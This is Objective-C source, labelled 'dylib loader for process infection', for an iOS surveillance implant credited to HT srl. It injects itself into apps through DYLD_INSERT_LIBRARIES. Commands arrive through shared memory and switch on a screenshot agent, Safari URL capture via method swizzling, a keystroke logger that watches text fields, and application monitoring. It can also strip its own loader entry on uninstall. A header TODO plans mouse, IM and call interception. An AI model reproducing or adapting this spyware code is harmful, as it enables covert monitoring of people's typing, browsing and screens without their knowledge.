/*
 * RCSIpony - dylib loader for process infection
 *  pon pon 
 *
 * [QUICK TODO]
 * - Cocoa Keylogger
 * - Cocoa Mouse logger
 * - URLGrabber
 *   - Safari
 * - IM (Skype/Nimbuzz/...)
 *   - Text
 *   - Call
 * - MobilePhone
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 07/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <UIKit/UIApplication.h>
#import <objc/runtime.h>
#import <unistd.h>
#import <dlfcn.h>

#import <fcntl.h>
#import <sys/mman.h>

#import "RCSILoader.h"
#import "RCSISharedMemory.h"

#import "RCSIAgentApplication.h"
#import "RCSIAgentInputLogger.h"
#import "RCSIAgentScreenshot.h"
#import "RCSIAgentURL.h"

#import "ARMHooker.h"


#define VERSION       0.6
//#define DEBUG

#define swizzleMethod(c1, m1, c2, m2) do { \
          method_exchangeImplementations(class_getInstanceMethod(c1, m1), \
                                         class_getInstanceMethod(c2, m2)); \
        } while(0)


//
// flags which specify if we are hooking the given module
// 0 - Initial State - No Hook
// 1 - Marked for Hooking
// 2 - Hook in place
// 3 - Marked for Unhooking
//
static int urlFlag          = 0;
static int keyboardFlag     = 0;
static int voiceCallFlag    = 0;
static int skypeFlag        = 0;
static int imFlag           = 0;
static int clipboardFlag    = 0;
static int scrFlag          = 0;
static int appFlag          = 0;

RCSISharedMemory      *mSharedMemoryCommand;
RCSISharedMemory      *mSharedMemoryLogging;
RCSIKeyLogger         *gLogger;

FILE *mFD;


BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SEL _newMethod)
{
  const char *name    = sel_getName(_original);
  const char *newName = sel_getName(_newMethod);

#ifdef DEBUG
  NSLog(@"SEL Name: %s", name);
  NSLog(@"SEL newName: %s", newName);
#endif

  Method methodOriginal = class_getInstanceMethod(_class, _original);
  
  if (methodOriginal == nil)
    {
#ifdef DEBUG
      NSLog(@"[IAEOR] Message not found [%s %s]\n", class_getName(_class), name);
#endif

      return FALSE;
    }
  
  const char *type  = method_getTypeEncoding(methodOriginal);
  //IMP old           = method_getImplementation(methodOriginal);
  
  if (!class_addMethod (_class, _newMethod, _newImplementation, type))
    {
#ifdef DEBUG
      NSLog(@"Failed to add our new method - probably already exists");
#endif
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Method added to target class");
#endif
    }
  
  Method methodNew = class_getInstanceMethod(_class, _newMethod);
  
  if (methodNew == nil)
    {
#ifdef DEBUG
      NSLog(@"[IAEOR] Message not found [%s %s]\n", class_getName(_class), newName);
#endif

      return FALSE;
    }
  
  method_exchangeImplementations(methodOriginal, methodNew);
  
  return TRUE;
}

void RILog (NSString *format, ...)
{
  va_list argList;
  
  va_start (argList, format);
  NSString *string = [[NSString alloc] initWithFormat: format
                                            arguments: argList];
  va_end (argList);
  
#ifdef DEBUG
  mFD = fopen ("/private/var/mobile/RCSIphone/dylib.log", "a");
  fprintf (mFD, "[RCSIPony] - %s\n", [string UTF8String]);
  fclose (mFD);
#endif
  
  [string release];
}

@implementation RCSILoader

- (void)checkForUninstall
{
  BOOL isUninstalled = NO;
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

#ifdef DEBUG
  NSLog(@"[DYLIB] %s: SB running poll commnad", __FUNCTION__);
#endif
  
  mSharedMemoryLogging = [[RCSISharedMemory alloc] initWithFilename: SH_LOG_FILENAME
                                                               size: SHMEM_LOG_MAX_SIZE];
  
  mSharedMemoryCommand = [[RCSISharedMemory alloc] initWithFilename: SH_COMMAND_FILENAME
                                                               size: SHMEM_COMMAND_MAX_SIZE];
  
  if ([mSharedMemoryLogging createMemoryRegionForAgent] == -1)
    {
#ifdef DEBUG
      NSLog (@"[DYLIB] %s: There was an error while creating the Logging Shared Memory", __FUNCTION__);
#endif
      return;
    }
  
  if ([mSharedMemoryCommand attachToMemoryRegion: NO] == -1)
    {
#ifdef DEBUG
      NSLog (@"[DYLIB] %s: There was an error while attaching to the Commands Shared Memory", __FUNCTION__);
#endif
      return;
    }
  
  if ([mSharedMemoryCommand createMemoryRegionForAgent] == -1)
    {
#ifdef DEBUG
      NSLog (@"[DYLIB] %s: There was an error while creating the Commands Shared Memory", __FUNCTION__);
#endif
      return;
    }
  
  while (mMainThreadRunning == YES)
    {
      NSMutableData     *readData = nil;
      shMemoryCommand   *shMemCommand;
    
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];

      readData = [mSharedMemoryCommand readMemory: OFFT_UNINSTALL
                                    fromComponent: COMP_AGENT];
  
      if (readData != nil)
        {
          NSString *libName, *libWithPathname; 
      
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: command UNINSTALL", __FUNCTION__);
#endif
          shMemCommand = (shMemoryCommand *)[readData bytes];
          
          if (shMemCommand->command == AG_UNINSTALL)
            {
              libName = [[NSString alloc] initWithBytes: shMemCommand->commandData 
                                                 length: shMemCommand->commandDataSize 
                                               encoding: NSASCIIStringEncoding];
              
              libWithPathname = [[NSString alloc] initWithFormat: @"/usr/lib/%@", libName];
              char *dylibStr = getenv("DYLD_INSERT_LIBRARIES");
              
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: dylib name %@", __FUNCTION__, libWithPathname);
#endif         
            
              if (dylibStr != NULL)
                {
                  NSString *dylibNSStr = [[NSString alloc] initWithBytes: dylibStr 
                                                                  length: strlen(dylibStr) 
                                                                encoding: NSASCIIStringEncoding];
#ifdef DEBUG
                  NSLog(@"[DYLIB] %s:envs %s", __FUNCTION__, dylibStr);
#endif
                  NSRange dlRange = [dylibNSStr rangeOfString: libWithPathname];
                  
                  if (dlRange.location  != NSNotFound
                      && dlRange.length != 0) 
                    {
                      // check if we're alone
                      if ([dylibNSStr length] == [libWithPathname length])
                        {
#ifdef DEBUG
                          NSLog(@"[DYLIB] %s: dylibNSStr.length %d  dylibPathname length %d", 
                                __FUNCTION__, [dylibNSStr length], [libWithPathname length]);
#endif
                          // Yes we're alone - remove
                          unsetenv("DYLD_INSERT_LIBRARIES");
#ifdef DEBUG
                          dylibStr = getenv("DYLD_INSERT_LIBRARIES");
                          
                          if (dylibStr == NULL) 
                            NSLog(@"[DYLIB] %s: unsetted ", 
                                  __FUNCTION__);
                          else
                            NSLog(@"[DYLIB] %s: unsetted %s", 
                                  __FUNCTION__, dylibStr);
#endif
                        }
                      else 
                        {
                          // delete the colon before or after...
                          if (dlRange.location != 0) 
                            dlRange.location--;
                          
                          // remove the colon too
                          dlRange.length++;
#ifdef DEBUG
                          NSLog(@"%s: delete chars in range %d %d", 
                                __FUNCTION__, dlRange.location, dlRange.length);
#endif        
                          NSMutableString *dylibNSStrOut = [[NSMutableString alloc]
                                                            initWithString: dylibNSStr];
                          
                          [dylibNSStrOut deleteCharactersInRange: dlRange];
                          
                          setenv("DYLD_INSERT_LIBRARIES",
                                 [dylibNSStrOut UTF8String],
                                 [dylibNSStrOut lengthOfBytesUsingEncoding: NSASCIIStringEncoding]);
#ifdef DEBUG
                          NSLog(@"%s: new val %@", 
                                __FUNCTION__, dylibNSStrOut);
#endif 
                          [dylibNSStrOut release];
                        }
                    }
              
                  [dylibNSStr release];
                }
            
              isUninstalled = YES;
              [readData release];
            }
        }

      [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.2]];
      [innerPool drain];
      
      if (isUninstalled) 
        break;
    }
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: dylib uninstalled exit thread", __FUNCTION__);
#endif
  
  mMainThreadRunning = NO;
  
  [outerPool release];
  
  [NSThread exit];
}

- (void)communicateWithCore
{  
  NSMutableDictionary *agentConfiguration;
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  //
  // Here we need to start the loop for checking and reading any configuration
  // change made on the shared memory
  //
  
  //int agentsCount = 8;
  //int agentIndex = 0;
  //
  // Initialize and attach to our Shared Memory regions
  //
  mSharedMemoryLogging = [[RCSISharedMemory alloc] initWithFilename: SH_LOG_FILENAME
                                                               size: SHMEM_LOG_MAX_SIZE];
  
  mSharedMemoryCommand = [[RCSISharedMemory alloc] initWithFilename: SH_COMMAND_FILENAME
                                                               size: SHMEM_COMMAND_MAX_SIZE];
  
  if ([mSharedMemoryLogging createMemoryRegionForAgent] == -1)
    {
#ifdef DEBUG
      NSLog (@"[DYLIB] %s: There was an error while creating the Logging Shared Memory", __FUNCTION__);
#endif
      return;
    }
  
  if ([mSharedMemoryCommand attachToMemoryRegion: NO] == -1)
    {
#ifdef DEBUG
      NSLog (@"[DYLIB] %s: There was an error while attaching to the Commands Shared Memory", __FUNCTION__);
#endif
      return;
    }
  
  if ([mSharedMemoryCommand createMemoryRegionForAgent] == -1)
    {
#ifdef DEBUG
      NSLog (@"[DYLIB] %s: There was an error while creating the Commands Shared Memory", __FUNCTION__);
#endif
      return;
    }
  
  while (mMainThreadRunning == YES)
    {
      NSMutableData     *readData = nil;
      shMemoryCommand   *shMemCommand;
    
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      if ([mSharedMemoryCommand isShMemValid] == NO ||
          [mSharedMemoryLogging isShMemValid] == NO)
        {
#ifdef DEBUG
          NSLog(@"%s: shared memory is invalid!", __FUNCTION__);
#endif
          if ([mSharedMemoryCommand restartShMem] == NO)
            {
#ifdef DEBUG
              NSLog(@"%s: fatal error on restart command shared mem", __FUNCTION__);
#endif
            }
          if ([mSharedMemoryLogging restartShMem] == NO)
            {
#ifdef DEBUG
              NSLog(@"%s: fatal error on restart log shared mem", __FUNCTION__);
#endif
            }
        }
    
      // Silly Code but it's faster than a switch/case inside a loop
      readData = [mSharedMemoryCommand readMemory: OFFT_SCREENSHOT
                                    fromComponent: COMP_AGENT];
      
      if (readData != nil)
        {
#ifdef DEBUG_VERBOSE_1
          NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
#endif
          shMemCommand = (shMemoryCommand *)[readData bytes];
        
          if (scrFlag == 0
              && shMemCommand->command == AG_START)
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: Started Screenshot Agent", __FUNCTION__);
#endif
              
              scrFlag = 1;
              
              NSData *agentData = [[NSData alloc] initWithBytes: shMemCommand->commandData 
                                                         length: shMemCommand->commandDataSize];
             
              agentConfiguration = [[NSMutableDictionary alloc] init];
              
              [agentConfiguration setObject: AGENT_START 
                                     forKey: @"status"];
              [agentConfiguration setObject: agentData 
                                     forKey: @"data"];
              
              RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
              [scrAgent setAgentConfiguration: agentConfiguration];
            
              [agentConfiguration release];
            }
          else if ((scrFlag == 1 || scrFlag == 2)
                   && shMemCommand->command == AG_STOP)
            {
              scrFlag = 3;
            }
          
          [readData release];
        }
    
      readData = [mSharedMemoryCommand readMemory: OFFT_URL
                                    fromComponent: COMP_AGENT];
      
      if (readData != nil)
        {
#ifdef DEBUG_VERBOSE_1
          NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
#endif
          
          shMemCommand = (shMemoryCommand *)[readData bytes];
          
          if (urlFlag == 0
              && shMemCommand->command == AG_START)
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: Starting Agent URL", __FUNCTION__);
#endif

              urlFlag = 1;
            }
          else if ((urlFlag == 1 || urlFlag == 2)
                   && shMemCommand->command == AG_STOP)
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: Stopping Agent URL", __FUNCTION__);
#endif
              
              urlFlag = 3;
            }
          
          [readData release];
        }
      
    readData = [mSharedMemoryCommand readMemory: OFFT_APPLICATION
                                  fromComponent: COMP_AGENT];
    
    if (readData != nil)
      {
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
#endif
      
      shMemCommand = (shMemoryCommand *)[readData bytes];
      
      if (appFlag == 0
          && shMemCommand->command == AG_START)
        {
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: Starting Agent Application", __FUNCTION__);
#endif
        
          appFlag = 1;
        }
      else if ((appFlag == 1 || appFlag == 2)
               && shMemCommand->command == AG_STOP)
        {
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: Stopping Agent Application", __FUNCTION__);
#endif
        
          appFlag = 3;
        }
      
        [readData release];
      }
    
      readData = [mSharedMemoryCommand readMemory: OFFT_KEYLOG
                                    fromComponent: COMP_AGENT];
      
      if (readData != nil)
        {
#ifdef DEBUG_VERBOSE_1
          NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
#endif
      
          shMemCommand = (shMemoryCommand *)[readData bytes];
      
          if (keyboardFlag == 0
              && shMemCommand->command == AG_START)
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: Starting Agent Keylog", __FUNCTION__);
#endif
              
              keyboardFlag = 1;
            }
          else if ((keyboardFlag == 1 || keyboardFlag == 2)
                   && shMemCommand->command == AG_STOP)
            {
#ifdef DEBUG
              NSLog(@"[DYLIB] %s: Stopping Agent Keylog", __FUNCTION__);
#endif
              
              keyboardFlag = 3;
            }
          
          [readData release];
        }
    
      if (scrFlag == 1)
        {
          scrFlag = 2;
          RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
          
          [NSThread detachNewThreadSelector: @selector(start)
                                   toTarget: scrAgent
                                 withObject: nil];
          
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: Started screenshot Agent", __FUNCTION__);
#endif
        }
      else if (scrFlag == 3)
        {
          scrFlag = 0;
          RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
        
          [scrAgent stop];
#ifdef DEBUG
          NSLog(@"[DYLIB] %s: Stopped Agent Screenshot", __FUNCTION__);
#endif
        }
      
      if (urlFlag == 1)
        {
          urlFlag = 2;
          
#ifdef DEBUG
          NSLog(@"Hooking URLs");
#endif
          
          Class className   = objc_getClass("TabController");
          Class classSource = objc_getClass("myTabController");
          
          if (className != nil)
            {
              swizzleByAddingIMP (className, @selector(tabDocumentDidUpdateURL:),
                                  class_getMethodImplementation(classSource, @selector(tabDocumentDidUpdateURLHook:)),
                                  @selector(tabDocumentDidUpdateURLHook:));
            }
          else
            {
#ifdef DEBUG
              NSLog(@"Not the right application, skipping");
#endif
            }
        }
      else if (urlFlag == 3)
        {
          urlFlag = 0;
          
#ifdef DEBUG
          NSLog(@"Unhooking URLs");
#endif
          
          Class className = objc_getClass("TabController");
          
          if (className != nil)
            {
              swizzleByAddingIMP (className, @selector(tabDocumentDidUpdateURL:),
                                  class_getMethodImplementation(className, @selector(tabDocumentDidUpdateURLHook:)),
                                  @selector(tabDocumentDidUpdateURLHook:));
            }
          else
            {
#ifdef DEBUG
              NSLog(@"Not the right application, skipping");
#endif
            }
        }

    if (appFlag == 1)
      {
        appFlag = 2;
      
        RCSIAgentApplication *appAgent = [RCSIAgentApplication sharedInstance];
      
        [appAgent start];
        
#ifdef DEBUG
        NSLog(@"Hooking Application");
#endif
  
      }
    else if (appFlag == 3)
      {
        appFlag = 0;
        RCSIAgentApplication *appAgent = [RCSIAgentApplication sharedInstance];
      
        [appAgent stop];
        
#ifdef DEBUG
        NSLog(@"Stopping Application");
#endif

      }
    
      if (keyboardFlag == 1)
        {
          keyboardFlag = 2;
          
#ifdef DEBUG
          NSLog(@"Hooking Keystrokes");
#endif
          
          Class className   = objc_getClass("UINavigationItem");
          Class classSource = objc_getClass("myUINavigationItem");
        
          gLogger = [[RCSIKeyLogger alloc] init];
          
          if (className != nil)
            {
              swizzleByAddingIMP (className, @selector(setTitle:),
                                  class_getMethodImplementation(classSource, @selector(setTitleHook:)),
                                  @selector(setTitleHook:));
            }
          else
            {
#ifdef DEBUG
              NSLog(@"Not the right application, skipping");
#endif
            }
          
          [[NSNotificationCenter defaultCenter] addObserver: gLogger
                                                   selector: @selector(keyPressed:)
                                                       name: UITextFieldTextDidChangeNotification
                                                     object: nil];
          [[NSNotificationCenter defaultCenter] addObserver: gLogger
                                                   selector: @selector(keyPressed:)
                                                       name: UITextViewTextDidChangeNotification
                                                     object: nil];
        }
      else if (keyboardFlag == 3)
        {
          keyboardFlag = 0;
          
#ifdef DEBUG
          NSLog(@"Unhooking Keystrokes");
#endif
          
          Class className = objc_getClass("UINavigationItem");
          
          if (className != nil)
            {
              swizzleByAddingIMP (className, @selector(setTitle:),
                                  class_getMethodImplementation(className, @selector(setTitleHook:)),
                                  @selector(setTitleHook:));
            }
          else
            {
#ifdef DEBUG
              NSLog(@"Not the right application, skipping");
#endif
            }
        
          [[NSNotificationCenter defaultCenter] removeObserver: gLogger
                                                          name: UITextFieldTextDidChangeNotification
                                                        object: nil];
          [[NSNotificationCenter defaultCenter] removeObserver: gLogger
                                                          name: UITextViewTextDidChangeNotification
                                                        object: nil];
          [gLogger release];
        }
      
      [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.2]];
    
      [innerPool release];
    }
  
  [pool release];
  
  return;
}

- (void)startCoreCommunicator
{
  NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
  
  if ([execName compare: SPRINGBOARD] == NSOrderedSame)
    {
      [NSThread detachNewThreadSelector: @selector(checkForUninstall)
                               toTarget: self
                             withObject: nil];
    }
  else 
    {
      [NSThread detachNewThreadSelector: @selector(communicateWithCore)
                               toTarget: self
                             withObject: nil];
    }
}

- (void)stopCoreCommunicator
{

}

- (id)init
{
  self = [super init];
  
  if (self != nil)
    {
       mMainThreadRunning = YES;
    }
}

@end


extern "C" void RCSIInit ()
{
  NSAutoreleasePool *pool     = [[NSAutoreleasePool alloc] init];
  
  NSString *bundleIdentifier  = [[NSBundle mainBundle] bundleIdentifier];
  
#ifdef DEBUG
  NSLog (@"RCSIphone loaded by %@ @ %@", bundleIdentifier,
         [[NSBundle mainBundle] bundlePath]);
#endif
    
  RCSILoader *loader = [[RCSILoader alloc] init];
  
  [[NSNotificationCenter defaultCenter] addObserver: loader
                                           selector: @selector(startCoreCommunicator)
                                               name: UIApplicationDidFinishLaunchingNotification
                                             object: nil];
  /*
  [[NSNotificationCenter defaultCenter] addObserver: loader
                                           selector: @selector(stopCoreCommunicator)
                                               name: UIApplicationWillTerminateNotification
                                             object: nil];
  */
  [pool drain];
}